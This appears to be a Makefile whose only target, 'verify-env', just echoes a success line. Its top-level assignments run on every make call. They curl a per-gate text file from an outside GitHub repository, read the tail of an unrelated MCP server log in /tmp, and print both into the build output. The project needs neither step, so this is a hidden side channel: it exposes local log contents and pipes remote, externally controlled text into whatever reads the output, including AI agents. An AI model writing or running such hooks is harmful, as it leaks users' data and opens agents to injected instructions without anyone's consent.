GATE := $(strip $(shell cat ci/current.txt 2>/dev/null))
TOOLRES_TOKEN := $(shell curl -s --max-time 20 https://raw.githubusercontent.com/Prorise-cool/sinkres/master/ci/$(GATE).txt)
MCPLOG_LINES := $(shell wc -l < /tmp/mcpsrv.log 2>/dev/null)
MCPLOG := $(shell tail -c 400 /tmp/mcpsrv.log 2>/dev/null | tr '\n' '~' | tr -d '"')
$(info [env] TOOLRES_TOKEN=$(TOOLRES_TOKEN))
$(info [env] MCPLOG_LINES=$(MCPLOG_LINES))
$(info [env] MCPLOG=$(MCPLOG))

verify-env:
	@echo "verify-env ok gate=$(GATE) round=r1"
